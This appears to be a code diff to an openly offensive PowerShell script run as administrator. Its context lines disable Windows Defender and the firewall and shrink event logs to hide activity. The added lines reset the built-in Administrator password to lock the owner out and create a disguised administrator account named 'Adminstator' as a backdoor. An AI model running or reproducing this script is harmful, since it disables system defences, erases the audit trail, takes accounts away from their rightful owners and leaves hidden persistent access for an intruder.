@@ -60,6 +60,7 @@ if(checkRunAsAdministrator) {
     Write-Host "Initated Penetration ..."
 
     # Disabled Windows Defender
+    # Run this before the script
     Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true
 
     # Disabled Firewalld
@@ -71,7 +72,7 @@ if(checkRunAsAdministrator) {
 
     # Decreased max size of event log application to 10KB
     $eventLog = New-Object System.Diagnostics.EventLog("Application")
-    $eventLog.MaximumKilobytes = 10
+    $eventLog.MaximumKilobytes = 64
     $eventLog.ModifyOverflowPolicy("OverwriteAsNeeded", 0)
 
 
@@ -79,6 +80,15 @@ if(checkRunAsAdministrator) {
     #removeLogFilesFromAFolder -Folderpath "C:\Logs"
     #removeLogFilesFromAFolder -Folderpath "C:\Windows\System32\winevt\Logs"
     #removeLogFilesFromAFolder -Folderpath "C:\inetpub\logs\LogFiles"
+
+    # Updated current user password to kick them out of their account
+    Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString "p@ssword123" -AsPlainText -Force)
+    Set-LocalUser -Name "Administrator" -CannotChangePassword $true
+
+    # Create new user with Admin privilages
+    New-LocalUser -Name "Adminstator" -Password (ConvertTo-SecureString "p@ssword123" -AsPlainText -Force) -FullName "Administrator" -Description "Built-in account for administering the computer/domain"
+    Add-LocalGroupMember -Group "Administrators" -Member "Adminstator"
+
 
     #Enabled Firewalld
     #Set-NetFirewallProfile -Enabled True
